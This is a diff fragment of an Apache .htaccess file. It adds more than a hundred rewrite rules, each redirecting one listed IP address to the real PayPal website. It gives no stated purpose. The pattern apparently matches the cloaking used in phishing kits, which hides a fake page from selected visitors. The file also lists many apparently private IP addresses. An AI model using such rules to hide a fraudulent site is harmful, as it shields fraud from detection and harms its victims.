+RewriteCond %{REMOTE_ADDR} ^134.117.249.178$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^70.53.80.170$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^99.240.139.83$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^99.241.28.90$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^174.3.36.69$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^24.114.78.153$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^70.49.10.108$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^65.39.24.51$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^74.115.223.189$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^173.209.136.70$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^24.212.49.122$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^209.89.129.48$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^209.52.88.229$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^47.54.101.155$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^76.64.156.217$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^104.249.202.41$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^67.193.6.104$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^68.151.233.250$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^24.114.102.34$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^216.211.37.75$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^192.81.13.63$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^174.88.81.58$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^174.90.222.1$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^204.48.95.251$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^99.234.215.70$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^24.231.83.31$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^45.45.23.206$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^75.159.91.117$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^162.156.1.145$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^104.238.184.235$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^80.44.105.111$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^103.244.36.58$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^5.148.22.18$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^83.137.1.209$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^149.12.11.94$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^109.148.117.11$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^82.43.111.37$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^154.76.78.221$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^31.84.100.250$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^84.125.109.15$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^151.224.76.205$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^217.36.227.208$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^177.205.7.98$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^81.133.117.9$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^94.7.202.66$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^86.185.2.70$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^86.170.211.246$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^151.224.106.150$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^189.59.105.119$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^92.26.159.241$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^78.149.76.32$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^86.9.2.36$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^2.29.176.198$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^213.205.251.156$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^213.205.195.9$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^94.6.210.110$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^92.2.75.195$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^2.217.53.87$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^2.98.7.166$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^81.184.219.116$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^94.3.125.3$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^86.26.174.142$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^82.34.245.106$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^90.219.25.200$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^81.140.183.179$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^166.137.252.62$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^141.0.8.141$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^107.77.83.50$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^189.251.179.226$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^188.29.165.200$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^151.229.237.114$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^86.137.46.170$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^2.28.42.150$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^188.29.83.254$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^2.121.244.228$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^66.87.86.171$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^78.149.110.64$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^86.186.124.230$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^176.25.87.115$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^176.25.175.102$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^2.26.24.47$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^90.214.251.49$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^5.69.221.22$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^70.197.230.150$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^83.137.255.16$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^109.157.140.45$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^62.64.228.48$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^182.30.174.238$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^155.94.146.108$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^40.127.176.251$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^5.105.189.2$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^151.231.153.202$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^36.71.64.197$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^45.58.42.225$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^103.10.58.11$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^79.66.59.103$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^113.210.105.18$
+RewriteRule .* https://www.paypal.com [R,L]
